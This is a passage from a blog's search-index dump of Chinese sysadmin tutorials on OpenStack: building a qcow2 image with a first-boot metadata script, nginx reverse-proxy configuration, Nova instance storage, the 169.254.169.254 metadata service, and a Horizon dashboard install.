已经运行的虚拟机将不受影响","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"高级优化","slug":"高级优化","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E4%BC%98%E5%8C%96/"},{"name":"nova","slug":"nova","permalink":"https://garywu520.github.io/tags/nova/"},{"name":"CPU超配","slug":"CPU超配","permalink":"https://garywu520.github.io/tags/CPU%E8%B6%85%E9%85%8D/"},{"name":"neutron防火墙","slug":"neutron防火墙","permalink":"https://garywu520.github.io/tags/neutron%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"深入理解OpenStack-手动制作qcow2镜像","slug":"深入理解OpenStack-手动制作qcow2镜像","date":"2018-01-18T08:34:31.000Z","updated":"2018-01-18T08:49:45.026Z","comments":true,"path":"2018/01/18/深入理解OpenStack-手动制作qcow2镜像/","link":"","permalink":"https://garywu520.github.io/2018/01/18/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3OpenStack-%E6%89%8B%E5%8A%A8%E5%88%B6%E4%BD%9Cqcow2%E9%95%9C%E5%83%8F/","excerpt":"手动制作镜像1官方虽提供qcow2系统镜像，但对于有需求的企业来说，还是定制镜像比较靠谱，下面就手动定制一个镜像","text":"手动制作镜像1官方虽提供qcow2系统镜像，但对于有需求的企业来说，还是定制镜像比较靠谱，下面就手动定制一个镜像 给虚拟机创建一个网络 1234567891011手动创建镜像需要确保libvirt运行有default网络，这个网络可以给虚拟机提供上网服务。查看当前是否启用default网络[root@compute ~]# virsh net-list Name State Autostart Persistent---------------------------------------------------------- default active yes yes 注：如果没有启用，使用以下命令启用default virsh net-start default 创建虚拟机 12345678910111213(1)创建一个目录mkdir -p &#x2F;data 上传iso镜像到&#x2F;data目录(2)创建一个10G的磁盘文件给虚拟机使用 qemu-img create -f qcow2 &#x2F;data&#x2F;centos.qcow2 10G(3)安装virt-install --virt-type kvm --name centos7.4_x86_64 --ram 1024 \\--disk &#x2F;data&#x2F;centos.qcow2,format&#x3D;qcow2 \\--network network&#x3D;default \\--graphics vnc,listen&#x3D;0.0.0.0 --noautoconsole \\--os-type&#x3D;linux \\--location&#x3D;&#x2F;data&#x2F;CentOS-7-x86_64-Minimal-1611.iso 使用TightVNC Viewer客户端连接虚拟机 123456要想连接虚拟机就需要执行一条命令来查看刚才新建虚拟机的端口信息[root@compute ~]# netstat -lntup |grep kvmtcp 0 0 0.0.0.0:5900 0.0.0.0:* LISTEN 90011&#x2F;qemu-kvm tcp 0 0 0.0.0.0:5901 0.0.0.0:* LISTEN 41365&#x2F;qemu-kvm 可以看到，当前运行有两台虚拟机，我刚刚创建的虚拟机端口是5901。 123456运行TightVNC Viewer客户端，Remote Host输入：192.168.56.12:5901 进行连接。连接成功后，就看到操作系统的引导界面了，这时候可以对虚拟机进行系统安装了。也可以根据企业需求进行个性化安装。安装结束后，点击reboot注：只有配置了KVM虚拟机，libvirt就会生成一个与操作系统对应的xml文件，其记录了kvm虚拟机的状态。路径如下：&#x2F;etc&#x2F;libvirt&#x2F;qemu&#x2F;CentOS-6.6-x86_64.xml 注：此文件只能通过“virsh edit”命令修改 启动KVM虚拟机 1234567891011121314151617列出所有虚拟机[root@compute ~]# virsh list --all Id Name State---------------------------------------------------- 7 instance-00000003 running 12 centos7.4_x86_64 shut off 启动虚拟机[root@compute ~]# virsh start centos7.4_x86_64[root@compute ~]# virsh list --all当此虚拟机再次启动后，再使用TightVNC Viewer客户端，Remote Host输入：192.168.56.12:5901 进行连接。此时可以在此系统中编辑已经提前准备并测试好的系统初始化脚本，并让脚本开机后运行，测试无误后将此虚拟机关机。（此步骤是把开机初始化脚本给封装到镜像中）在这个虚拟机系统中运行shutdown -h now 即可 关于系统优化脚本-脚本参考 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!&#x2F;bin&#x2F;bashset_key()&#123; if [ ! -d &#x2F;root&#x2F;.ssh ]; then mkdir -p &#x2F;root&#x2F;.ssh chmod 700 &#x2F;root&#x2F;.ssh fi# Fetch public key using HTTP ATTEMPTS&#x3D;30 FAILED&#x3D;0 while [ ! -f &#x2F;root&#x2F;.ssh&#x2F;authorized_keys ]; do curl -f http:&#x2F;&#x2F;169.254.169.254&#x2F;latest&#x2F;meta-data&#x2F;public-keys&#x2F;0&#x2F;openssh-key &gt; &#x2F;tmp&#x2F;metadata-key 2&gt;&#x2F;dev&#x2F;null if [ &quot;$?&quot; -eq 0 ]; then cat &#x2F;tmp&#x2F;metadata-key &gt;&gt; &#x2F;root&#x2F;.ssh&#x2F;authorized_keys chmod 0600 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys restorecon &#x2F;root&#x2F;.ssh&#x2F;authorized_keys rm -f &#x2F;tmp&#x2F;metadata-key echo &quot;Successfully retrieved public key from instance metadata&quot; echo &quot;*****************&quot; echo &quot;AUTHORIZED KEYS&quot; echo &quot;*****************&quot; cat &#x2F;root&#x2F;.ssh&#x2F;authorized_keys echo &quot;*****************&quot; else FAILED&#x3D;&#96;expr $FAILED + 1&#96; if [ $FAILED -ge $ATTEMPTS ];then echo &quot;Failed&quot; break fi sleep 5 fidone&#125;set_hostname()&#123; echo &quot;hehe&quot; SET_HOSTNAME&#x3D;$(curl -s http:&#x2F;&#x2F;169.254.169.254&#x2F;2009-04-04&#x2F;meta-data&#x2F;hostname | awk -F &#39;.&#39; &#39;&#123;print $1&#125;&#39;) VM_HOSTNAME&#x3D;&quot;$SET_HOSTNAME&quot;.example.com hostnamectl set-hostname $VM_HOSTNAME&#125;set_static_ip()&#123; echo &quot;hehe&quot; &#x2F;bin&#x2F;cp &#x2F;tmp&#x2F;ifcfg-eth0-example &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0 VM_IPADDR&#x3D;$(curl -s http:&#x2F;&#x2F;169.254.169.254&#x2F;2009-04-04&#x2F;meta-data&#x2F;local-ipv4) sed -i &quot;s&#x2F;9.9.9.9&#x2F;$VM_IPADDR&#x2F;g&quot; &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0&#125;main()&#123; set_key; set_hostname; set_static_ip; rm -f &#x2F;tmp&#x2F;get_metadata.sh &#x2F;bin&#x2F;cp &#x2F;tmp&#x2F;rc.local &#x2F;etc&#x2F;rc.d&#x2F;rc.local&#125;main 将制作好的/data/centos.qcow2镜像文件上传到Glance 12345678910注：在控制节点进行镜像上传(1)source变量source &#x2F;scripts&#x2F;admin-openrc(2)镜像上传openstack image create &quot;CentOS7.4_x86_64&quot; --file &#x2F;data&#x2F;centos.qcow2 \\--disk-format qcow2 --public(3)openstack dashboard中创建虚拟机,并验证脚本执行情况 附录：virsh命令-使用 12345678910111213141516171819202122232425virsh --helpvirt-clone -o centos7_mini -n centos7_mini15 --auto-clone #克隆mini，新克隆的为mini15-o #原始机名字，必须为关闭或暂停状态-n #新客户机的名称--auto-clone #从原始客户机配置中自动生成克隆名称和存储路径--replace #不检查命名冲突，覆盖任何使用相同名称的客户机-f #可以指定克隆后的主机镜像放在指定目录下virsh autostart xxx #让子机随宿主机开机自动启动virsh autostart --disable xxx #解除自动启动virt-install #建立kvm虚拟机virsh list #查看正在运行的KVM虚拟机virsh list --all #查看所有KVM虚拟机virsh start name #启动KVM虚拟机virsh shutdown name #正常关闭KVM虚拟机virsh destroy name #强制关闭KVM虚拟机(类似于直接断电)virsh suspend name #挂起KVM虚拟机virsh resume name #恢复挂起的KVM虚拟机virsh dumpxml name #查看KVM虚拟机配置文件，可以把输出的内容定义到xml里，用来克隆迁移用。virsh edit name #编辑KVM虚拟机的xml配置文件virsh define &#x2F;etc&#x2F;libvirt&#x2F;qemu&#x2F;name.xml #定义注册虚拟机，需要先查看xml文件对应的镜像，img等路径是否存在或修改指定路径virsh undefine name #彻底删除KVM虚拟机,不可逆,如果想找回来,需要备份&#x2F;etc&#x2F;libvirt&#x2F;qemu的xml文件 注：gentoo使用livecd安装的过程中，关于安装文件如何上传到livecd的问题，解决方案如下： 1kvm安装安装启动livecd，然后通过桥接联网将文件上传，再执行脚本安装和初始化。最后将qcow2文件上传到glance。最后通过openstack dashboard来使用qcow2镜像安装gentoo","categories":[],"tags":[{"name":"Glance","slug":"Glance","permalink":"https://garywu520.github.io/tags/Glance/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"qcow2","slug":"qcow2","permalink":"https://garywu520.github.io/tags/qcow2/"},{"name":"制作镜像","slug":"制作镜像","permalink":"https://garywu520.github.io/tags/%E5%88%B6%E4%BD%9C%E9%95%9C%E5%83%8F/"}]},{"title":"nginx生产环境-案例2","slug":"nginx生产环境-案例2","date":"2018-01-16T12:45:46.000Z","updated":"2018-01-16T13:54:39.820Z","comments":true,"path":"2018/01/16/nginx生产环境-案例2/","link":"","permalink":"https://garywu520.github.io/2018/01/16/nginx%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83-%E6%A1%88%E4%BE%8B2/","excerpt":"1环境要求：mongo，redis，nginx，PHP7.1，ffmpeg\\ffprobe和fastDFS扩展），其中，nginx需要同时启用80和443","text":"1环境要求：mongo，redis，nginx，PHP7.1，ffmpeg\\ffprobe和fastDFS扩展），其中，nginx需要同时启用80和443 1对项目进行充分分析并详细沟通后，基本架构如下（本例只聊聊Nginx区域）： Nginx前端机配置 vim /etc/nginx/conf.d/news.qq.com 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758upstream qq_com &#123; server 192.168.10.188 max_fails&#x3D;3 fail_timeout&#x3D;10s; server 192.168.10.211 max_fails&#x3D;3 fail_timeout&#x3D;10s; &#125;######----------------------------------80配置区域-----------------------------------#####server &#123; listen 30.251.241.177:80; server_name news.qq_com; root &#x2F;var&#x2F;www&#x2F;news.qq_com; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;qq_com; proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; set $chost &quot;info.qq&quot;; #注：info.qq是后端服务器nginx配置中ServerName名称 proxy_set_header Host $chost; proxy_set_header X-Forwarded-For $remote_addr; &#125; location &#x3D; &#x2F;favicon.ico &#123; access_log off; log_not_found off; &#125; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;news.qq_com.access_log main; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;news.qq_com.error_log warn;&#125;######----------------------------------443配置区域-----------------------------------#####server &#123; listen 30.251.241.177:443; server_name news.qq_com; root &#x2F;var&#x2F;www&#x2F;news.qq_com; ssl on; ssl_certificate &#x2F;etc&#x2F;ssl&#x2F;qq_com&#x2F;qq_com.pem; ssl_certificate_key &#x2F;etc&#x2F;ssl&#x2F;qq_com&#x2F;qq_com.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers HIGH:!RC4:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!EXP:+MEDIUM; ssl_prefer_server_ciphers on; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;qq_com; proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; set $chost &quot;info.qq&quot;; proxy_set_header Host $chost; proxy_set_header X-Forwarded-For $remote_addr; &#125; location &#x3D; &#x2F;favicon.ico &#123; access_log off; log_not_found off; &#125; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;news.qq_com.ssl.access_log main; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;news.qq_com.ssl.error_log warn;&#125; Nginx前后端调用流程 1用户请求url:news.qq.com, 通过A记录域名解析，其中一台前端机接收并处理请求，然后nginx调用upstream模块，并把处理交给其中一台后端机处理请求，后端机解析本地nginx的info.qq.conf文件 Nginx后端机配置 vim /etc/nginx/conf.d/info.qq.conf 1234567891011121314151617181920212223server &#123; listen 192.168.10.188:80; server_name info.qq; #注意此处是info.qq,需要与前端机定义保持一致。 root &#x2F;var&#x2F;www&#x2F;news.qq.com&#x2F;; location &#x2F; &#123; if (!-f $request_filename) &#123; # 一级目录下 rewrite ^&#x2F;(.*)$ &#x2F;index.php&#x2F;$1 last; &#125; &#125; # pathinfo 模式 location ~ \\index.php(.*) &#123; fastcgi_index index.php; fastcgi_pass php7; #注意这里,往下看 include fastcgi.conf; &#125; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;news.qq.com.access_log main; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;news.qq.com.error_log warn;&#125; 此处需要注意下fastcgi调用方式（socket/端口），也可以提前写到配置文件中，此处只进行使用名称即可,前提是这个文件需要在nginx.conf中include vim /etc/nginx/conf.d/upstream_fastcgi.conf 123456upstream php &#123; server unix:&#x2F;var&#x2F;run&#x2F;php-fpm.sock weight&#x3D;100 max_fails&#x3D;10 fail_timeout&#x3D;30;&#125;upstream php7 &#123; server unix:&#x2F;var&#x2F;run&#x2F;php-fpm7.sock weight&#x3D;100 max_fails&#x3D;10 fail_timeout&#x3D;30;&#125; 关于请求测试 1配置完毕后，本地可修改host解析去请求news.qq.com域名，然后分别查看前端机的80访问日志和ssl访问日志","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"upstream","slug":"upstream","permalink":"https://garywu520.github.io/tags/upstream/"},{"name":"80","slug":"80","permalink":"https://garywu520.github.io/tags/80/"},{"name":"443","slug":"443","permalink":"https://garywu520.github.io/tags/443/"}]},{"title":"深入理解OpenStack-虚拟机存放目录","slug":"深入理解OpenStack-虚拟机存放目录","date":"2018-01-15T08:26:09.000Z","updated":"2018-01-16T01:49:29.832Z","comments":true,"path":"2018/01/15/深入理解OpenStack-虚拟机存放目录/","link":"","permalink":"https://garywu520.github.io/2018/01/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3OpenStack-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AD%98%E6%94%BE%E7%9B%AE%E5%BD%95/","excerpt":"前言 1现在已经部署好了OpenStack，并且成功创建并运行了一台虚拟机。现在还没有使用Cinder的块存储，那么这台虚拟机在物理硬盘上存在了哪里呢？","text":"前言 1现在已经部署好了OpenStack，并且成功创建并运行了一台虚拟机。现在还没有使用Cinder的块存储，那么这台虚拟机在物理硬盘上存在了哪里呢？ 123由计算节点的nova配置文件nova.conf中的可知：默认存储路径为&#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances具体控制参数为：instances_path&#x3D;$state_path&#x2F;instances,而state_path这个变量的路径为&#x2F;var&#x2F;lib&#x2F;nova 12345678910111213目录结构如下:[root@compute instances]# tree.├── 1612ab91-6294-46d0-9262-e5020e9f24dc│ ├── console.log │ ├── disk│ └── disk.info├── _base│ └── a7cd09d9e59baa8f81e5e6f7f61bcbeac9eb179c├── compute_nodes└── locks ├── nova-a7cd09d9e59baa8f81e5e6f7f61bcbeac9eb179c └── nova-storage-registry-lock 12345678910111213来看下虚拟机的大小[root@compute 1612ab91-6294-46d0-9262-e5020e9f24dc]# ls -lhtotal 2.7M-rw------- 1 root root 19K Jan 12 22:23 console.log-rw-r--r-- 1 qemu qemu 2.7M Jan 15 16:20 disk-rw-r--r-- 1 nova nova 79 Jan 12 22:16 disk.info可以看到disk只有2.7M, 一个系统内核都比这个要大，这是为啥呢？ 在file下这个disk文件[root@compute 1612ab91-6294-46d0-9262-e5020e9f24dc]# file diskdisk: QEMU QCOW Image (v3), has backing file (path &#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances&#x2F;_base&#x2F;a7cd09d9e59baa8f81e5e6f7f61bcbeac), 5368709120 bytes使用的是QCOW V3版本，QCOW格式特点之一就是：支持写时拷贝(COW, copy-on-write),镜像文件只反映底层的磁盘变化。 什么是Copy-on-Write镜像文件？ 1qcow 镜像可以用来保存另一个镜像文件的变化，它并不去修改原始镜像文件，只记录与原始镜像文件的不同即可，这种镜像文件就叫做 copy-on-write 镜像。虽然是一个单独的文件，但它的大部分的数据都来自原始镜像，只有跟原始镜像文件相比有变化的才会被记录下来。 可以通过qemu-img命令获取更详细的内容: 1234567891011121314[root@compute 1612ab91-6294-46d0-9262-e5020e9f24dc]# qemu-img info diskimage: diskfile format: qcow2virtual size: 5.0G (5368709120 bytes) #这里才是真正创建的虚拟机大小disk size: 2.6M #QCOW2更小的空间占用cluster_size: 65536backing file: &#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances&#x2F;_base&#x2F;a7cd09d9e59baa8f81e5e6f7f61bcbeac9eb179cFormat specific information: compat: 1.1 lazy refcounts: false refcount bits: 16 corrupt: false 支持写时拷贝（COW, copy-on-write），镜像文件只反映底层磁盘的变化；也就是说现在我们看到的disk这个磁盘镜像，是&#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances&#x2F;_base&#x2F;a7cd09d9e59baa8f81e5e6f7f61bcbeac9eb179c基础上变化的内容。可以通过qemu-img命令获取更详细的内容。 接下来查看下真正镜像的详细信息： 12345678[root@compute instances]# qemu-img info &#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances&#x2F;_base&#x2F;a7cd09d9e59baa8f81e5e6f7f61bcbeac9eb179c image: &#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances&#x2F;_base&#x2F;a7cd09d9e59baa8f81e5e6f7f61bcbeac9eb179cfile format: rawvirtual size: 39M (41126400 bytes)disk size: 18M可以看到，这是一个raw格式的镜像，虚拟大小是39M, 实际使用是18M Libvirt.xml 1我们知道OpenStack是使用Nova-compute来调用底层的KVM来创建虚拟机，那么既然是使用libvirt那么在我们&#x2F;etc&#x2F;libvirt&#x2F;qemu下面就应该能看到相应的xml 123456789101112[root@compute ~]# cd &#x2F;etc&#x2F;libvirt&#x2F;qemu[root@compute qemu]# lsinstance-00000003.xml networks[root@compute qemu]# head -6 instance-00000003.xml &lt;!--WARNING: THIS IS AN AUTO-GENERATED FILE. CHANGES TO IT ARE LIKELY TO BEOVERWRITTEN AND LOST. Changes to this xml configuration should be made using: virsh edit instance-00000003or other application using the libvirt API.--&gt;和之前我们创建KVM虚拟机一样，这个xml是自动生成的，提示你不要修改本xml，如果想修改可以使用 virsh edit instance-00000001。好吧，千万不要使用virsh来试图修改OpenStack创建的虚拟机的xml，因为你修改了没有用，因为OpenStack会在虚拟机软重启或者硬重启的时候重新动态的生成libvirt.xml。到时候你所有的修改，就消失了。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"云主机","slug":"云主机","permalink":"https://garywu520.github.io/tags/%E4%BA%91%E4%B8%BB%E6%9C%BA/"}]},{"title":"深入理解OpenStack-虚拟机元数据metadata","slug":"深入理解OpenStack-虚拟机元数据metadata","date":"2018-01-15T06:25:59.000Z","updated":"2018-01-16T01:50:38.311Z","comments":true,"path":"2018/01/15/深入理解OpenStack-虚拟机元数据metadata/","link":"","permalink":"https://garywu520.github.io/2018/01/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3OpenStack-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%85%83%E6%95%B0%E6%8D%AEmetadata/","excerpt":"概念 12OpenStack云主机metadata(元数据)是一组与一台云主机相关联的键值对。用户可以通过API读写这些键值对。云主机或者Nova服务也可以获取这些metadata。","text":"概念 12OpenStack云主机metadata(元数据)是一组与一台云主机相关联的键值对。用户可以通过API读写这些键值对。云主机或者Nova服务也可以获取这些metadata。 OpenStack元数据分类 1元数据可以分为实例元数据(instance metadata)和用户数据(instance user data)。 1234实例元数据包括键值对或者自定义键值对.用户数据是以user-data为键的元数据，供部署在云主机中的云感知应用使用。用户数据与普通实例元数据的不同在于它先于云主机创建，并从云主机中访问，可以用于存储配置、脚本以及其它任何信息。 查询元数据有何作用？ 1在OpenStack云主机上通过请求Metadata元数据API，来获取云主机上的主机名、IP地址、SSH公钥等信息。通过这些信息可以通过编写脚本来对云主机的标准化进行定制。 查询云主机元数据 云主机中,可以通过访问http://169.254.169.254 这个URL来获取它的元数据信息。 1234567891011121314在控制节点上ssh虚拟机ssh cirros@192.168.56.53获取元数据metadata$ curl http:&#x2F;&#x2F;169.254.169.254&#x2F;1.02007-01-192007-03-01...2008-09-012009-04-04latest这个返回结果是元数据服务目前支持的接口版本号，可以选择最新的2009-04-04来查询元数据。 1234567891011121314151617$ curl http:&#x2F;&#x2F;169.254.169.254&#x2F;2009-04-04&#x2F;meta-data&#x2F;ami-idami-launch-indexami-manifest-pathblock-device-mapping&#x2F;hostnameinstance-actioninstance-idinstance-typelocal-hostnamelocal-ipv4placement&#x2F;public-hostnamepublic-ipv4public-keys&#x2F;reservation-idsecurity-groups 123456789101112比如：1. 获取虚拟机的IP地址 $ curl http:&#x2F;&#x2F;169.254.169.254&#x2F;2009-04-04&#x2F;meta-data&#x2F;local-ipv4 192.168.56.532. 获取虚拟机的主机名 $ curl http:&#x2F;&#x2F;169.254.169.254&#x2F;2009-04-04&#x2F;meta-data&#x2F;hostname first1host.novalocal 3. 获取已上传到虚拟机中的ssh-key $ curl http:&#x2F;&#x2F;169.254.169.254&#x2F;2009-04-04&#x2F;meta-data&#x2F;public-keys&#x2F;0&#x2F;openssh-key ssh-rsa AAAAB3NzaC1yc2EA......kDwKNgF3 root@controller metadata元数据获取流程 1234567获取元数据的请求会通过云主机的默认网关,路由到网络节点上该云主机所在虚拟网络的虚拟网关设备上，并通过iptables的NAT规则重定向到neutron-ns-metadata-proxy服务，再经由neutron-metadata-agent最终由nova-api里提供的metadata服务返回云主机的虚拟机。 注(重要)：在&#x2F;etc&#x2F;neutron&#x2F;dhcp_agent.ini中有enable_isolated_metadata这个选项，设置为True后，如果一个虚拟网络没有网关则DHCP服务会给这个主机增加一条路由，将元数据请求路由到DHCP服务。只要DHCP服务与元数据服务在一台主机上就可以由后者去处理该请求了。如下图(参考): (1)虚拟机发出请求 1234567891011查看虚拟机网卡信息$ ip -4 address show dev eth0 eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000 inet 192.168.56.53&#x2F;24 brd 192.168.56.255 scope global eth0查看虚拟机路由$ ip route listdefault via 192.168.56.2 dev eth0 169.254.169.254 via 192.168.56.50 dev eth0 192.168.56.0&#x2F;24 dev eth0 src 192.168.56.53 (2)namespace-metadata-proxy 123456789101112131415161718我的网络环境因为是扁平桥接所以下面是qdhcp设备。因为使用了namespace，在network node上每个namespace里都会有相应的iptables规则和网络设备。先获取当前虚拟网络设备或获取网络名称空间[root@controller ~]# ip netnsqdhcp-605a77b4-d232-4d0b-b915-d6572542c3d5 (id: 0)获取这个虚拟网络设备的ip地址信息[root@controller ~]# ip netns exec qdhcp-605a77b4-d232-4d0b-b915-d6572542c3d5 ip addr show 2:ns-fda843d0-0e@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP qlen 1000 link&#x2F;ether fa:16:3e:bb:39:10 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.168.56.50&#x2F;24 brd 192.168.56.255 scope global ns-fda843d0-0e valid_lft forever preferred_lft forever inet 169.254.169.254&#x2F;16 brd 169.254.255.255 scope global ns-fda843d0-0e valid_lft forever preferred_lft forever inet6 fe80::f816:3eff:febb:3910&#x2F;64 scope link valid_lft forever preferred_lft forever可以看到169.254.169.254地址是绑定在qdhcp-605a77b4-d232-4d0b-b915-d6572542c3d5 (id: 0)虚拟设备上的ns-fda843d0-0e@if5这个网卡上的，然后再看看它的下一步路由 1234567891011[root@controller ~]# ip netns exec qdhcp-605a77b4-d232-4d0b-b915-d6572542c3d5 ip routedefault via 192.168.56.2 dev ns-fda843d0-0e 169.254.0.0&#x2F;16 dev ns-fda843d0-0e proto kernel scope link src 169.254.169.254 192.168.56.0&#x2F;24 dev ns-fda843d0-0e proto kernel scope link src 192.168.56.50 这就可以理解它为什么能与192.168.56.0&#x2F;24网络通信了接下来ping下ip netns exec qdhcp-605a77b4-d232-4d0b-b915-d6572542c3d5 ping 192.168.56.2ip netns exec qdhcp-605a77b4-d232-4d0b-b915-d6572542c3d5 ping 169.254.169.254结果都是通的 (3)Neutron Metadata Agent network node上的metadata agent监听/var/lib/neutron/metadata_proxy 1234567891011121314151617我这里的PIKE版本启用的是Neutron Metadata Agent, 控制节点上查看以下信息[root@controller ~]# netstat -lxp |grep metadataunix 2 [ ACC ] STREAM LISTENING 128073 6622&#x2F;python2 &#x2F;var&#x2F;lib&#x2F;neutron&#x2F;metadata_proxy[root@controller ~]# ps -f --pid 6622 |fold -sUID PID PPID C STIME TTY TIME CMDneutron 6622 1 0 02:39 ? 00:00:38 &#x2F;usr&#x2F;bin&#x2F;python2 &#x2F;usr&#x2F;bin&#x2F;neutron-metadata-agent --config-file &#x2F;usr&#x2F;share&#x2F;neutron&#x2F;neutron-dist.conf --config-file &#x2F;etc&#x2F;neutron&#x2F;neutron.conf --config-file &#x2F;etc&#x2F;neutron&#x2F;metadata_agent.ini --config-dir &#x2F;etc&#x2F;neutron&#x2F;conf.d&#x2F;common --config-dir &#x2F;etc&#x2F;neutron&#x2F;conf.d&#x2F;neutron-metadata-agent --log-file &#x2F;var&#x2F;log&#x2F;neutron&#x2F;metadata-agent.log该进程的功能是，根据请求头部的X-Forwarded-For和X-Quantum-Router-ID参数，向Quantum service查询虚拟机ID，然后向Nova Metadata服务发送请求（默认端口8775），消息头：X-Forwarded-For，X-Instance-ID、X-Instance-ID-Signature分别表示虚拟机的fixedIP，虚拟机ID和虚拟机ID的签名。 (4) Nova Metadata Service 12345678910Nova的metadata service是随着nova-api启动的。虚拟机访问169.254.169.254的返回内容，其实就是metadata服务向nova-conductor查询后，返回给network node的metadata agent，再由metadata agent返回给metadata proxy，然后返回给虚拟机的。[root@controller ~]# netstat -lntup |grep 8775tcp 0 0 0.0.0.0:8775 0.0.0.0:* LISTEN 6263&#x2F;python2 You have new mail in &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root[root@controller ~]# ps -f --pid 6263UID PID PPID C STIME TTY TIME CMDnova 6263 1 1 02:29 ? 00:12:21 &#x2F;usr&#x2F;bin&#x2F;python2 &#x2F;usr&#x2F;bin&#x2F;nova-ap 为什么请求的IP地址是169.254.169.254？ 123这个IP地址在OpenStack中是不存在的，为什么可以获取到metadata呢？这是因为Amazon的原因，最早metadata是通过亚马逊提出来的。 参考： Amazon Ec2-instance-metadata介绍 1后来很多开源机构给亚马逊定制了一些操作系统的镜像，比如 ubuntu, fedora, centos 等等，而且将里面获取 metadta 的api地址也写死了。所以opentack为了兼容，保留了这个地址 169.254.169.254。然后通过iptables nat映射到真实的api上.","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"元数据","slug":"元数据","permalink":"https://garywu520.github.io/tags/%E5%85%83%E6%95%B0%E6%8D%AE/"},{"name":"metadata","slug":"metadata","permalink":"https://garywu520.github.io/tags/metadata/"}]},{"title":"OpenStack-Pike-Horizen Web管理10","slug":"OpenStack-Pike-Horizen-Web管理10","date":"2018-01-14T04:57:23.000Z","updated":"2018-01-15T09:05:06.510Z","comments":true,"path":"2018/01/14/OpenStack-Pike-Horizen-Web管理10/","link":"","permalink":"https://garywu520.github.io/2018/01/14/OpenStack-Pike-Horizen-Web%E7%AE%A1%E7%90%8610/","excerpt":"1生产环境最好将Horizen安装在非控制节点，因为控制节点已经运行有了Apache服务，重启服务的话都会有影响。另外Horizen可以安装多个，Horizen的配置不需要部署数据库等等信息，它是直接通过API调用的Keystone","text":"1生产环境最好将Horizen安装在非控制节点，因为控制节点已经运行有了Apache服务，重启服务的话都会有影响。另外Horizen可以安装多个，Horizen的配置不需要部署数据库等等信息，它是直接通过API调用的Keystone 安装Openstack官方源 1234567891011#安装OpenStack源yum install -y centos-release-openstack-pike升级包yum -y upgrade 安装OpenStack客户端yum install -y python-openstackclient安装 openstack-selinux包实现对OpenStack服务的安全策略进行自动管理：yum install -y openstack-selinux 安装Dashboard包 1yum install openstack-dashboard 配置 1vim &#x2F;etc&#x2F;openstack-dashboard&#x2F;local_settings 123配置OpenStack Host在控制节点上启用dashboardOPENSTACK_HOST &#x3D; &quot;192.168.56.11&quot; 123配置哪些主机有权限访问仪表盘ALLOWED_HOSTS &#x3D; [&#39;*&#39;,] 12345678910配置memcached会话存储服务SESSION_ENGINE &#x3D; &#39;django.contrib.sessions.backends.cache&#39;CACHES &#x3D; &#123; &#39;default&#39;: &#123; &#39;BACKEND&#39;: &#39;django.core.cache.backends.memcached.MemcachedCache&#39;, &#39;LOCATION&#39;: &#39;192.168.56.11:11211&#39;, &#125;&#125; 123启用API 版本3OPENSTACK_KEYSTONE_URL &#x3D; &quot;http:&#x2F;&#x2F;%s:5000&#x2F;v3&quot; % OPENSTACK_HOST 1234启用对域的支持OPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT &#x3D; True 注意: True是大写 1234567配置API版本OPENSTACK_API_VERSIONS &#x3D; &#123; &quot;identity&quot;: 3, &quot;image&quot;: 2, &quot;volume&quot;: 2,&#125; 